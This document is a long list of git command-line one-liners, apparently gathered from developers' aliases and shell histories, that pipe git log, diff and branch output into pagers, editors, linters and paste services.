git log --oneline \$(git fsck --no-reflogs | awk '/dangling commit/ {print \$3}')
git log --oneline HEAD ^master | wc -l
git log --oneline @{u}..HEAD | wc -l
git log --oneline . | less
git log --oneline -n 10 --color | emojify
git log --oneline -n $n | tee
git log --oneline -1; git log --oneline -1 | xclip -selection c
git log --oneline --stat | less -R -S
git log --oneline --stat --graph | less -R -S
git log --oneline --since=yesterday | pbcopy
git log --oneline --reverse | head -n 1
git log --oneline --reverse | head -20
git log --oneline --graph | less -R -S
git log --oneline --graph --decorate --color=always --pretty=format:'%Cgreen%h%Creset -%C(yellow)%d%Creset %s'| less -R
git log --oneline --graph --color --all --decorate | reverse_log.py
git log --oneline --format=%B -n 1 HEAD | head -n 1
git log --oneline --decorate | less -R -S
git log --oneline --decorate | head
git log --oneline --decorate --graph | less -R -S
git log --oneline --decorate --graph --all | less -R -S
git log --oneline --decorate --graph --all | head -20
git log --oneline --decorate --color=always | less -R
git log --oneline --decorate --color | head
git log --oneline --color=always | head -n 20
git log --oneline --color=always | head
git log --oneline --color=always | fzf --multi --preview 'git show --color {+1}' --preview-window up:60%
git log --oneline --color=always | fzf --multi --preview 'git show --color {+1}'
git log --oneline --color | emojify
git log --oneline --color --decorate | emojify
git log --oneline --all | wc -l
git log --oneline --abbrev-commit --all --graph --decorate --color | head -n 15
git log --numstat | awk -f ~/.bash/git_score.awk
git log --numstat | awk -f $APPLEBIN/git-author-commits.awk
git log --numstat | awk -f $APPLEBIN/bin/git-author-commits.awk
git log --no-merges --stat --date=iso --pretty=format:'%C(yellow)%h %C(green)[%ad | %ar] %C(cyan)%ae %C(reset)%s%C(white)%d'
git log --no-merges --patch --date=iso --pretty=format:'%C(yellow)%h %C(green)[%ad | %ar] %C(cyan)%ae %C(reset)%s%C(white)%d'
git log --no-merges --date=iso --pretty=format:'%C(yellow)%h %C(green)[%ad | %ar] %C(cyan)%ae %C(reset)%n%s%n%n%b'
git log --no-merges --date=iso --pretty=format:'%C(yellow)%h %C(green)[%ad | %>(14)%ar] %C(cyan)%ae %C(reset)%s%C(white)%d' master..
git log --no-merges --date=iso --pretty=format:'%C(yellow)%h %C(green)[%ad | %>(14)%ar] %C(cyan)%ae %C(reset)%s%C(white)%d' develop..
git log --no-merges --date=iso --pretty=format:'%C(yellow)%h %C(green)[%ad | %>(14)%ar] %C(cyan)%ae %C(reset)%s%C(white)%d'
git log --no-merges --color --stat --date=format:'%Y-%m-%d %H:%M:%S' --author='pengfei\|itsneo1990' --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Cblue %s %Cgreen(%cd) %C(bold blue)<%an>%Creset' --abbrev-commit
git log --no-merges --color --date=format:'%Y-%m-%d %H:%M:%S' --author='pengfei\|itsneo1990' --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Cblue %s %Cgreen(%cd) %C(bold blue)<%an>%Creset' --abbrev-commit
git log --no-color --date-order --tags --simplify-by-decoration --pretty=format:'%ai %h %d' --date=format:'%Y-%m-%d %H:%M:%S' | grep --color tag
git log --name-status --oneline --all | grep -P \
git log --merges --date=iso --pretty=format:'%C(yellow)%h %C(green)[%ad | %>(14)%ar] %C(cyan)%ae %C(reset)%s%C(white)%d'
git log --grep snemeth --grep Szilard --grep 'Szilard Nemeth' --oneline | wc -l
git log --grep grepas --grep 'Gergo Repas' --oneline | wc -l
git log --graph | less
git log --graph -20 --pretty=format:'%C(yellow)%h¤%Cred%ar¤%Cblue%an¤%Cgreen%d %Creset%s' | column -ts '¤'
git log --graph --pretty=tformat:$GIT_LOG_FORMAT | perl -p -e $GIT_LOG_REGEX
git log --graph --pretty=oneline --abbrev-commit | tig
git log --graph --pretty=format:'%h -%d% %s (%ci - %cr) <%an>' --abbrev-commit | vi -R -c 'set filetype=git' -
git log --graph --pretty=format:'%h - %d %s (%cr) <%an>' | vim -R -c 'set filetype=git nowrap' -
git log --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)<%an>%Creset' --date=relative | less -R
git log --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)<%an>%Creset' --abbrev-commit | vim - +'set nonu' +'set ls=0' +'nnoremap q :qa!<CR>' +'echo(\
git log --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)<%an>%Creset' --abbrev-commit | less
git log --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)<%an>%Creset' --abbrev-commit | head -n 25
git log --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)<%an>%Creset' --abbrev-commit -- | less
git log --graph --pretty=format:'%Cred%h%Creset %an: %s - %Creset %C(yellow)%d%Creset %Cgreen(%cr)%Creset' --abbrev-commit --date=relative | head -20
git log --graph --pretty=format:'%Cred%h | %Cgreen%ad %Cblue<%an> %n%Creset%s%n'
git log --graph --pretty=format:'%<(1)%Cred%h%Creset %an: %s %Creset%C(blue)|%Creset%C(yellow)%d%Creset %Cgreen(%cr)%Creset - %C(cyan)[%cd]%Creset' --abbrev-commit --date=format:'%H:%M:%S %d/%m/%Y'
git log --graph --oneline --decorate --all $( git fsck --no-reflog | awk '/dangling commit/ {print $3}' )
git log --graph --oneline --decorate $(git fsck --no-reflogs | awk
git log --graph --oneline --decorate $( git fsck --no-reflog | awk '/dangling commit/ {print $3}' ) > /dev/null
git log --graph --oneline --date=short \$(git describe --tags --candidates=1 | cut -d'-' -f1)..HEAD
git log --graph --format='%Cred%h%Creset %s %Cblue%an | %ad%Creset %Cgreen%d%Creset' --date=local
git log --graph --decorate --pretty=oneline --abbrev-commit | head -n15
git log --graph --decorate --oneline --color | less -R
git log --graph --decorate --oneline --all | less
git log --graph --decorate --color=always | cless -i
git log --graph --decorate --color=always --all | cless -i
git log --graph --date=iso --pretty=format:'%C(yellow)%h %C(green)[%ad | %ar] %C(cyan)%ae %C(reset)%s%C(white)%d'
git log --graph --date=iso --pretty=format:'%C(yellow)%h %C(green)[%ad | %>(14)%ar] %C(cyan)%ae %C(reset)%s%C(white)%d' @{upstream}..
git log --graph --date=iso --pretty=format:'%C(yellow)%h %C(green)[%ad | %>(14)%ar] %C(cyan)%ae %C(reset)%s%C(white)%d' ..@{upstream}
git log --graph --color | less -R
git log --graph --all --pretty=format:$GIT_LOG_FORMAT \$(git branch | sed 's/*//g')
git log --graph --all --decorate --pretty=oneline -n 8 | cat
git log --graph --abbrev-commit --decorate --format=format:'%C(bold blue)%h%C(reset) - %C(bold green)(%ar)%C(reset) %C(white)%s%C(reset) %C(dim white)- %an%C(reset)%C(bold yellow)%d%C(reset)' | peco
git log --graph --abbrev-commit --decorate --date=relative --format=format:'%C(bold blue)%h%C(reset) - %C(bold green)(%ar)%C(reset) %C(white)%s%C(reset) %C(dim white)- %an%C(reset)%C(bold yellow)%d%C(reset)' --all | tac
git log --graph --abbrev-commit --decorate --date=relative --format=format:'%C(bold blue)%h%C(reset) - %C(bold green)(%ar)%C(reset) %C(white)%s%C(reset) %C(dim white)- %an%C(reset)%C(bold yellow)%d%C(reset)' --all | less -r
git log --format=oneline | head
git log --format='%h %ad | %s%d [%an]' --graph --date=short
git log --format='%aN' | uniq -u
git log --format='%aN' | sort -u
git log --format='%aN <%aE>' | sort -u
git log --format=%H | tail -1
git log --format=%H | head -1
git log --ext-diff -p | cdiff -s
git log --diff-filter=D --summary | grep delete
git log --decorate | less -R -S
git log --decorate --oneline --graph | less
git log --date=short --pretty=format:'%Cgreen%h %cd %Cblue%cn%x09%Creset%s' | tail -1 && echo '' && git status -s -b
git log --date=short --max-count=1 --pretty=format:'%Cgreen%h %cd %Cblue%cn%x09%Creset%s' | tail -1 && echo '' && git status -s -b
git log --date=short --graph --all --pretty=format:'%C(bold yellow)%h%C(reset) %C(bold cyan)%cd%C(reset)%C(bold red)%d%C(reset) %C(bold white)%s%C(reset) %C(dim white)| %aN%C(reset)'
git log --date=iso --pretty=format:'%C(yellow)%h %C(green)[%ad | %>(14)%ar] %C(cyan)%ae %C(reset)%s%C(white)%d' @{upstream}..
git log --date=iso --pretty=format:'%C(yellow)%h %C(green)[%ad | %>(14)%ar] %C(cyan)%ae %C(reset)%s%C(white)%d' ..@{upstream}
git log --date=iso --pretty=format:'%C(yellow)%h %C(green)[%ad | %>(14)%ar] %C(cyan)%ae %C(reset)%s%C(white)%d'
git log --color|fzf --ansi --select-1 --reverse --multi
git log --color=always | less -r
git log --color=always | less -R
git log --color=always --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %C(bold magenta)(%cr) %C(bold cyan)<%an>%Creset' --abbrev-commit | head
git log --color=always --pretty=format:'%C(yellow)%h %Cred%ad %Cblue%an %Creset%s' --date=short | fzf --tiebreak=index --ansi --preview \
git log --color=always --date=short | less -R
git log --color | emojify
git log --color --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)<%an>%Creset' --abbrev-commit|head
git log --color --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)<%an>%Creset' --abbrev-commit --stat -1 | cat
git log --color --oneline | head
git log --color --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue)%an <%cn>%Creset' --abbrev-commit --all | less -R
git log --color --graph --pretty=format:'%Cred%h%Creset -%C(yellow)%d%Creset %s %Cgreen(%cr) %C(bold blue) <%aN|%G?>%Creset' --abbrev-commit
git log --color --decorate --oneline | head
git log --author=brenton -i --pretty=format:'%h %ar%x09* %s' | less
git log --author='solos' --pretty=tformat: --numstat | gawk '{add += \$1 ; subs += \$2 ; loc += \$1 - \$2;} END {printf \
git log --all --pretty=format: --name-only --diff-filter=D | sort -u
git log --all --not --remotes --tags --oneline | wc -l
git log --all --graph --decorate --oneline --color=always | head -n $(( $(tput lines) - 5 ))
git log --all --graph --decorate --color=always | less -R -i
git log --all --graph --abbrev-commit --pretty=oneline --decorate --color | less
git log --all --format='%aN' | sort -u
git log --all --decorate --oneline --graph --color=always | head --lines=20
git log --all --ancestry-path ^HEAD --format=format:%H | cat
git log --abbrev-commit --format=oneline | grep
git log $(git log --pretty=format:%H|tail -1)
git ln | perl -ple 's/\*/sprintf(\
git ll|head -20 && echo
git llog | less -R
git list-changed-tests | xargs rspec --drb
git link | pbcopy
git lg|head -n 30
git lg|head
git lgg | head
git lga --color=always | less -RS
git lg1 | head -10
git lg | less
git lg | head -n12
git lg | head -n 6
git lg | head -n 40; echo
git lg | head -n 20
git lg | head -n 15
git lg | head -30
git lg | head -10
git lg | head
git lg | grep ago
git lg | fzf
git lg --reverse --color=always --max-count=50 | less +G -R
git lg --color|head -24
git lg --all --color=always | less -R
git lg --all --color=always | less -FRSX
git lfhas | head
git latest | sed '1!G;h;\$!d'
git latest | less
git la | grep
git l | head
git l | grep
git l --all | head
git itouch | sort -u
git intwt | pbcopy && cd $(pbpaste)
git init . && git add . && git commit -m 'Git some' | grep -v '^ create mode'
git icdiff | less -SRi
git icdiff | less
git hist | less
git hist | head -n 10
git hist | head -20
git hist --all | more
git gsp | fix_ruby
git grquick | head
git grjustme | head
git grep YOUAREHERE | cat
git grep TODO | grep -v TODO.md
git grep -lz ://standardjs.com | xargs -0 standard --parser babel-eslint -v --fix
git grep -I --name-only -z -e '' | xargs -0 sed -i 's/[ \t]\+\(\r\?\)$/\1/'
git grep -Ei 'TODO|FIXME'
git grep --untracked -inE '(TODO|FIXME)' ':!vendor'
git grep --color=always --no-index --exclude-standard --heading --break --ignore-case -e ' FIX: *' -e ' TODO: *' | sed -e 's/^[[:space:]]*//'
git graphviz | dot -Tsvg -o $(date +%F_%H%M).svg
git graph | head -n 10
git glog | head
git gdstable | fix_ruby
git gdmaster | fix_ruby
git g -n 20 | tail -n 100
git fsck | awk
git fsck --no-reflog | awk '/dangling commit/ {print $3}'
git fsck --no-reflog | awk
git fsck --lost-found | awk '{print \
git fsck --full --no-reflogs --unreachable --lost-found && ls -1 .git/lost-found/commit/ | xargs -n 1 git log -n 1 --pretty=oneline
git format-patch -1 HEAD --stdout | ./scripts/checkpatch.pl - --max-line-length=100 --min-conf-desc-length=1 --ignore GERRIT_CHANGE_ID --ignore MISSING_SIGN_OFF --ignore FILE_PATH_CHANGES --ignore COMMIT_LOG_LONG_LINE
git format-patch -1 --stdout | ./scripts/checkpatch.pl -
git format-patch -1 --stdout | $MK/scripts/checkpatch.pl -
git format-patch --stdout master | xclip -i
git format-patch --stdout -M -C -C -1 | wgetpaste -r
git format-patch --stdout -M -C -C -1 | wgetpaste --raw
git format-commit | pbcopy
git forked | head -n 10
git forest --all --style=10 --topo-order --color=always --pretty=format:' %s %C(blue)%an %C(red)%h%C(reset)' | less -R
git forest --all --sha | less -XR
git forest --all --sha | less -R
git for-each-ref refs/heads --format='%(align:70)%(refname:short)%(end) %(committerdate:iso8601) (%(committerdate:relative))' --sort -committerdate | head -n30
git for-each-ref --sort=committerdate refs/remotes/ --format='$FORMAT' | tail -10
git for-each-ref --sort=committerdate refs/heads/ --format='%1B[0;33m%(authordate:short)%1B[0;31m %(refname:short)%1B[m | %(subject)' refs/heads
git for-each-ref --sort=committerdate refs/heads/ --format='%(committerdate:short) %(refname:short) %(committername)' | column -t
git for-each-ref --sort=committerdate refs/heads/ --format='%(HEAD) %(color:yellow)%(refname:short)%(color:reset) - %(color:red)%(objectname:short)%(color:reset) - %(contents:subject) - %(authorname) (%(color:green)%(committerdate:relative)%(color:reset))' | tail -15
git for-each-ref --sort=committerdate refs/heads/ --format='%(HEAD) %(color:yellow)%(refname:short)%(color:reset) - %(color:red)%(objectname:short)%(color:reset) - %(contents:subject) - %(authorname) (%(color:green)%(committerdate:relative)%(color:reset))' | tail -10
git for-each-ref --sort=committerdate refs/heads/ --format='%(HEAD) %(color:yellow)%(refname:short)%(color:reset) - %(color:red)%(objectname:short)%(color:reset) - %(contents:subject) - %(authorname) (%(color:green)%(committerdate:relative)%(color:reset))' | tail
git for-each-ref --sort=committerdate refs/heads/ --format='%(HEAD) %(color:yellow)%(refname:short)%(color:reset) - %(color:red)%(objectname:short)%(color:reset) - %(contents:subject) - %(authorname) (%(color:green)%(committerdate:relative)%(color:reset))' | grep WIP
git for-each-ref --sort=committerdate refs/heads/ --format='%(HEAD) %(color:red)%(objectname:short)%(color:reset);%(color:yellow)%(refname:short)%(color:reset);(%(color:green)%(committerdate:relative)%(color:reset));%(authorname);%(contents:subject)' | column -t -s ';'
git for-each-ref --sort=committerdate refs/heads | tail
git for-each-ref --sort=-committerdate refs/remotes/origin/ | head
git for-each-ref --sort=-committerdate refs/remotes | sed 's_commit[[:space:]]refs/remotes/__g'
git for-each-ref --sort=-committerdate refs/heads/ | tac
git for-each-ref --sort=-committerdate refs/heads/ | sed 's/^.*heads\///g'
git for-each-ref --sort=-committerdate refs/heads/ | less
git for-each-ref --sort=-committerdate refs/heads/ | head -n40
git for-each-ref --sort=-committerdate refs/heads/ | head
git for-each-ref --sort=-committerdate refs/heads/ | awk '{ gsub(\
git for-each-ref --sort=-committerdate refs/heads/ --format='%(refname:short)' | tac
git for-each-ref --sort=-committerdate refs/heads/ --format='%(refname)' | sed 's/refs\/heads\///g'
git for-each-ref --sort=-committerdate refs/heads/ --format='%(refname) %(committerdate) %(authorname)' | sed 's/refs\/heads\///g'
git for-each-ref --sort=-committerdate refs/heads/ --format='%(committerdate:short) - %(authorname) %09 %09 %(refname:short) ' |head
git for-each-ref --sort=-committerdate refs/heads/ --format='%(committerdate:short) %(authorname) %(refname:short)' | grep Nimish
git for-each-ref --sort=-committerdate refs/heads/ --format='%(committerdate)%09%09%(refname:short)' | sed 's/refs\/heads\///g'
git for-each-ref --sort=-committerdate refs/heads/ --format='%(color:blue)(%(committerdate:relative))%(color:reset) %(color:yellow)%(refname):%(color:reset) %(color:red)%(objectname:short)%(color:reset) %(contents:subject) %(color:green)%(authorname)%(color:reset)' | sed 's/refs\/heads\///g'
git for-each-ref --sort=-committerdate refs/heads/ --format='%(HEAD) %(color:yellow)%(refname:short)%(color:reset) - %(color:red)%(objectname:short)%(color:reset) - %(contents:subject) - %(authorname) (%(color:green)%(committerdate:relative)%(color:reset))' | less
git for-each-ref --sort=-committerdate refs/heads/ --format='%(HEAD) %(color:yellow)%(refname:short)%(color:reset) - %(color:red)%(objectname:short)%(color:reset) - %(contents:subject) - %(authorname) (%(color:green)%(committerdate:relative)%(color:reset))' | head
git for-each-ref --sort=-committerdate refs/heads/ --format='%(HEAD) %(color:red)%(objectname:short)%(color:reset) - %(authorname) (%(color:blue)%(committerdate:relative)%(color:reset)) - %(color:yellow)%(refname:short)%(color:reset) - %(contents:subject)' | head
git for-each-ref --sort=-committerdate refs/heads | sed 's_commit[[:space:]]refs/heads/__g'
git for-each-ref --sort=-committerdate refs/heads | head -n 10
git for-each-ref --sort=-committerdate --format='%(refname:short)' refs/heads/ | tail -r
git for-each-ref --sort=-committerdate --format='%(refname:short)' refs/heads/ | head -10
git for-each-ref --sort=-committerdate --format='%(refname)' refs/heads | head -5
git for-each-ref --sort=-committerdate --format='%(committerdate:short) %(refname)' refs/heads refs/remotes | head
git for-each-ref --sort='authoremail' --format='%(committerdate)%09%(authorname) %(authoremail) %(refname)%09=> %(subject)' refs/remotes/origin/ | sed 's/refs\/remotes\/origin\///'
git for-each-ref --sort='authordate:iso8601' --format=' %(authordate:relative)%09%(refname)' refs/heads | sed 's/refs\/heads\///g'
git for-each-ref --sort='-committerdate' --format='%(refname)' refs/heads | sed -e 's-refs/heads/--'
git for-each-ref --sort='-committerdate' --format='%(refname)%09%(committerdate)' refs/heads | sed -e 's-refs/heads/--'
git for-each-ref --sort='-committerdate' --format='%(committerdate)%09%(refname)' refs/heads | sed -e 's-refs/heads/--'
git for-each-ref --sort='-committerdate' --format='%(color:green)%(authordate)%09>> %(color:blue) %(refname)' refs/heads | sed -e 's-refs/heads/--'
git for-each-ref --sort='-authordate:iso8601' --format=' %(authordate:relative)%09%(refname:short)' refs/heads | tac
git for-each-ref --sort='-authordate' --format='%(objectname:short)%09%(refname)' refs/heads | sed -e 's-refs/heads/--'
git for-each-ref --sort='-authordate' --format='%(authordate)%09%(objectname:short)%09%(refname)' refs/heads | sed -e 's-refs/heads/--'
git for-each-ref --format='%(committerdate) %09 %(authorname) %09 %(refname)'| sort -k5n -k2M -k3n -k4n
git for-each-ref --format='%(committerdate) %09 %(authorname) %09 %(refname)' | sort -k5n -k2M -k3n -k4n
git for-each-ref --count=30 --sort=-committerdate refs/heads/ --format='%(refname)' | cut -d / -f 3-
git for-each-ref --count=20 --sort=-committerdate refs/heads/ --format='%(refname)' | sed 's/refs\/heads\///g'
git for-each-ref --count=10 --sort=-committerdate --color=auto --format='%(refname:short)' refs/heads/ | less
git for-each-ref --color=always --sort=-committerdate refs/heads/ --format='%(HEAD) %(color:yellow)%(refname:short)%(color:reset) - %(color:red)%(objectname:short)%(color:reset) - %(contents:subject) - %(authorname) (%(color:green)%(committerdate:relative)%(color:reset))' | head -6
git for-each-ref --color --sort=committerdate refs/heads/ --format='%(HEAD) %(color:yellow)%(refname:short)%(color:reset) - %(contents:subject) - %(authorname) (%(color:green)%(committerdate:relative)%(color:reset))' |tail -n 15
git flow feature publish $(git branch | sed -n '/\* feature\//s///p')
git fetch | git pull
git fetch origin; git reset --hard $(git remote | head -1)/$(git name-rev --name-only HEAD); git clean -fdx
git fetch origin && git remote prune origin && git branch -r | awk
git fetch -p; git branch --merged | egrep -v \
git fetch -p && git branch -vv | grep
git fetch -p && git branch -vv | awk
git fetch -p && for branch in `git branch -vv | grep
git fetch --tags ; git tag | sort -V
git fetch --tags && git tag -l --sort=-creatordate | head -1
git fetch --prune; git branch -r | awk
git fetch --prune && git checkout devel && git rebase origin/devel && (git branch --merged | egrep -v \
git fetch --prune && git branch -r | awk
git fetch --prune && git branch --merged | grep -v \
git fetch --prune && git branch --merged | egrep -v \
git fetch --prune && git branch --merged master | grep -v 'master$' >/tmp/merged-branches && vim /tmp/merged-branches && xargs git branch -d </tmp/merged-branches
git fetch --prune && git branch --merged master | egrep -v
git fetch --all; touch branches.now.lst; mv branches.now.lst branches.old.lst; git branch --list --remote | sort > branches.now.lst; vdiff branches.old.lst branches.now.lst
git fetch --all -p; git branch -vv | grep \
git fetch --all -p; git branch -vv | grep ': gone]'
git fetch --all --prune; git branch --merged origin/master | grep -v
git fetch --all --prune 2>&1 | suggest_remove_branch
git fetch --all && git rev-parse --abbrev-ref HEAD | xargs -t -i {} git merge origin/{}
git fetch --all && git rev-parse --abbrev-ref HEAD | xargs -t -I {} git merge origin/{}
git fetch && hub compare \`git tag|tail -1\`..master
git fetch && git rebase origin/$(git branch 2>/dev/null | grep
git fetch && git merge origin/master | grep CONFLICT
git fetch && git co devel && git pull origin devel && git branch --merged | egrep -v \
git fetch && git checkout --track $(git branch -r | fzf)
git fetch && git branch --merged | xargs git branch -d && git remote prune origin
git fetch $(git rev-parse --symbolic-full-name --abbrev-ref @{upstream} | sed
git ds|less
git ds | h
git domo|fpp
git diff|tig
git diff|mate
git diff|less
git diff|e
git diff|colordiff
git diff| mate
git difftool -y -x 'colordiff -y -W $COLUMNS' | less -R
git difftool -y --extcmd icdiff --color=always | less -R
git difftool --extcmd icdiff --no-prompt | less -R
git difftool --extcmd icdiff --no-prompt \`last_shared_commit\` HEAD | less -R
git difftool --extcmd 'icdiff --highlight --line-numbers' | less
git diff-tree -r --no-commit-id --name-only head origin/master | xargs rubocop --force-default-config
git diff-tree -r --no-commit-id --name-only head origin/master | xargs rubocop --auto-correct
git diff-tree -r --no-commit-id --name-only head origin/master | xargs rubocop
git diff-tree -r --no-commit-id --name-only HEAD | xargs bundle exec rubocop --auto-correct
git diff-tree -r --no-commit-id --name-only @\{u\} head | xargs bundle exec rubocop -a
git diff-tree --no-commit-id --name-only -r HEAD | xargs sed -i 's/[[:space:]]*$//'
git diff-files -z --diff-filter=M --name-only | xargs -0 git add
git diff-files -z --diff-filter=M --name-only --relative | xargs -0 git add
git diff | ~/linux/linux-4.1.19/scripts/checkpatch.pl --no-tree --no-signoff -
git diff | ydiff -s -w 0
git diff | ydiff -s
git diff | vimdiff -
git diff | vimdiff
git diff | vim -R -
git diff | vim -M - +'set nonu' +'set ls=1' +'nnoremap q :qa!<CR>' +'echo(\
git diff | vim - -R
git diff | vim -
git diff | vim
git diff | view -
git diff | vi - -R
git diff | vi -
git diff | vi
git diff | v
git diff | tosubl
git diff | tmpin subl
git diff | tmpin atom
git diff | tig
git diff | subl -w
git diff | subl -n -b
git diff | subl --new-window
git diff | subl &
git diff | subl
git diff | snip
git diff | pbcopy
git diff | open
git diff | nvim -MR -
git diff | nvim -
git diff | nvim
git diff | nano
git diff | mvim -R -
git diff | mvim -
git diff | mvim
git diff | meld .
git diff | meld -
git diff | meld
git diff | mate -
git diff | mate
git diff | m
git diff | lv
git diff | less -R -S
git diff | less
git diff | kompare - > /dev/null 2>&1 &
git diff | kompare - > /dev/null
git diff | idiff
git diff | gvim -R -
git diff | gvim --remote-silent
git diff | grep TODO
git diff | grep HEAD
git diff | grep -C 3 -f ~/.gitunwanted
git diff | grep -C 2
git diff | grep 'binding.pry'
git diff | gitx
git diff | git
git diff | gist -t diff
git diff | gist -o -t diff
git diff | gedit
git diff | e
git diff | dsnip
git diff | diff-so-fancy
git diff | diff
git diff | curl -F 'sprunge=<-' http://sprunge.us
git diff | colordiff
git diff | code -
git diff | code
git diff | cdiff -s
git diff | cat
git diff | bbedit
git diff | bat
git diff | atom-beta
git diff | atom
git diff | adt
git diff | PatctSpellChecker.py
git diff | /usr/local/bin/mvim -f
git diff | /Applications/Geany.app/Contents/MacOS/geany
git diff | /Applications/DeltaWalker.app/Contents/MacOS/git-diff
git diff | ${EDITOR}
git diff | $GIT_EDITOR -
git diff | $EDITOR -
git diff | $EDITOR
git diff production --name-only | xargs rubocop -a
git diff origin|gist -t diff
git diff origin/master...HEAD --name-only --diff-filter=DMR | xargs
git diff origin/master... | gist -t diff -c -o -p
git diff origin/master | mate
git diff origin/master | less -R -S
git diff origin/master | $EDITOR
git diff origin/master --name-only | xargs sublime
git diff origin/master --name-only | xargs rubocop -a
git diff origin/master --name-only | xargs bundle exec rubocop -a
git diff origin/master --name-only | xargs ./scripts/bin/lint -n
git diff master.. --name-only | xargs ls -d 2>/dev/null
git diff master | mate
git diff master | less -R -S
git diff master | grep print
git diff master | flake8 --diff
git diff master | egrep '^diff --git'
git diff master | adt
git diff master n | mate
git diff master --stat --name-only | xargs subl
git diff master --stat --name-only | xargs atom
git diff master --name-status | tee
git diff master --name-only | cat
git diff master --name-only | atom
git diff head^ | mate
git diff develop | less
git diff dev --name-only | cat
git diff `mh` --numstat | cut -f 3
git diff `git tag --sort version:refname | tail -n 1` HEAD
git diff `git stash list|cut -d
git diff `git merge-base origin/master HEAD` --name-only | xargs -I {} rubocop --auto-correct {}
git diff \$(git merge-base HEAD \$(git log --pretty=format:'%s' -i --grep='merge' -n 1 | awk '{print \$NF}'))
git diff HEAD~1 --stat | fpp
git diff HEAD~ HEAD --color-words --word-diff-regex='\\w+|[^[:space:]]'
git diff HEAD~ --color=always | less -r
git diff HEAD^ HEAD | mate
git diff HEAD\^ HEAD | vim - -R
git diff HEAD..master --name-only | grep migr
git diff HEAD | vim -
git diff HEAD | vim
git diff HEAD | view -
git diff HEAD | tmpin atom&
git diff HEAD | subl&
git diff HEAD | subl --new-window
git diff HEAD | mate
git diff HEAD | less
git diff HEAD | flake8 --diff
git diff HEAD | cless
git diff HEAD | cdiff -s -w 100
git diff HEAD | adt
git diff HEAD | $EDITOR
git diff HEAD --stat=200 | fp
git diff HEAD --name-only | xargs -I {} yarn prettier --write {}
git diff HEAD --name-only --relative | xargs -I {} yarn prettier --write {}
git diff > tmpDiff.diff | subl tmpDiff.diff
git diff . |V
git diff . | vi -
git diff . | mate
git diff . | cl
git diff -w | subl
git diff -w | mate
git diff -w | git apply --cached --ignore-whitespace
git diff -w develop | rg TODO
git diff -w --no-color | git apply --cached --ignore-whitespace && git checkout . && git reset
git diff -w --no-color | git apply --cached --ignore-whitespace && git checkout -- . && git reset && git add -p
git diff -w --no-color | git apply --cached --ignore-whitespace
git diff -w --no-color | git apply --cached
git diff -w --color | diff-so-fancy
git diff -w ${@} | ${DIFF_READER}
git diff -p -R | grep -E \
git diff -b | sed -e 's/^+++ b\//> /' -e '/^--- a/d'
git diff -b --numstat master | egrep $
git diff -U20 | gist -t diff
git diff -U1 master... | jiradiff.pl
git diff -U0 | grepdiff ' \
git diff -U0 HEAD^ | clang-format-diff.py -i -p1
git diff -U0 -w --no-color | git apply --cached --ignore-whitespace --unidiff-zero;git checkout .
git diff -U0 -w --no-color | git apply --cached --ignore-whitespace --unidiff-zero -
git diff -U0 -w --no-color | git apply --cached --ignore-whitespace --unidiff-zero
git diff -U0 -w --no-color $@ | git apply --cached --ignore-whitespace --unidiff-zero -
git diff -U0 --no-color HEAD^ | clang-format-diff.py -i -p1
git diff -U0 --no-color HEAD^ | clang-format-diff -p1 -i
git diff -U0 --color | diff-lines
git diff --word-diff=color | less -R -S
git diff --word-diff=color --word-diff-regex='[A-z0-9_]+|[^[:space:]]'
git diff --word-diff=color --cached | less -R -S
git diff --unified=0 | grep -Po '(?<=^\+)(?!\+\+).*'
git diff --unified=0 HEAD | grep -i todo
git diff --stat | fpp
git diff --stat --name-only | xargs git rm --cached --ignore-unmatch -f -r --
git diff --stat --color | cat
git diff --staged | vim -R -
git diff --staged | vim -
git diff --staged | tig
git diff --staged | python -m ydiff --side-by-side --width 100
git diff --staged | gist -t diff
git diff --staged --diff-filter=ACMR --name-only | xargs bundle exec rubocop
git diff --staged --color=always | less -r
git diff --staged --color=always | less
git diff --relative --no-prefix | e
git diff --numstat | awk '{if ((\$1 == \
git diff --numstat | awk
git diff --no-prefix | vim -
git diff --no-index | diff-so-fancy
git diff --no-index --word-diff-regex='\\w+|[^[:space:]]'
git diff --no-ext-diff -w |vim -R -
git diff --no-ext-diff -U20 --no-prefix develop | xsel --clipboard
git diff --no-ext-diff -U20 --no-prefix develop | tee /tmp/precommit.patch
git diff --no-color | vim -
git diff --no-color | $EDITOR
git diff --name-status master... | sort
git diff --name-status master... | cat
git diff --name-status master | sort
git diff --name-status master | grep \
git diff --name-status master | awk '{print \$2;}'
git diff --name-status --cached | more
git diff --name-only | xargs sublime
git diff --name-only | xargs subl
git diff --name-only | xargs rubocop
git diff --name-only | xargs prettier --write
git diff --name-only | xargs git checkout
git diff --name-only | xargs clang-format -style=file -i
git diff --name-only | xargs bundle exec rubocop -a
git diff --name-only | xargs atom .
git diff --name-only | xargs -n 1 -p git checkout
git diff --name-only | xargs -n 1 -p git add
git diff --name-only | xargs $EDITOR
git diff --name-only | uniq
git diff --name-only | pbcopy
git diff --name-only | more
git diff --name-only | fzf --multi --color=dark --cycle --border --ansi --preview-window=up:70% --preview=\
git diff --name-only | cat
git diff --name-only | awk '/.php$/ {system(\
git diff --name-only origin/master... | xargs bin/rubocop
git diff --name-only origin/master | xargs ag TODO
git diff --name-only origin/master `git rev-parse --abbrev-ref HEAD` | grep
git diff --name-only origin/develop | xargs -I{} autoflake --in-place --remove-all-unused-imports {}
git diff --name-only origin/HEAD | xargs bundle exec rubocop -a
git diff --name-only origin/HEAD | xargs bundle exec rubocop -P
git diff --name-only master..HEAD | cat
git diff --name-only master | xargs rubocop --auto-correct
git diff --name-only master | xargs nvim
git diff --name-only master | xargs -n1 checkcs
git diff --name-only HEAD~1..HEAD | ls_color
git diff --name-only HEAD^ | cat
